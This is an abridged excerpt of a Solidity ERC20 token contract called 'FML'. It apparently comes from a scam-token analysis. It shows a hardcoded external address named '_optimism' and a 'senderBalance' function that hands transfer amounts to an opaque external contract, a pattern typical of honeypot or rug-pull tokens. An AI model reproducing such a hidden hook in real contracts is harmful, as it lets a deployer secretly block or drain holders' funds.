...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _optimism = 0x0178d64d81F9dFedcF0830D6943260aB79bc3CEF;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return optimism.transactL2(amount);
    }
    ...
    function _DeployFML(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFML(creator, initialSupply);
    }
}

contract FML is ERC20Token {
    constructor() ERC20Token("FML", "FML", msg.sender, 6660000 * 10 ** 18) {
    }
}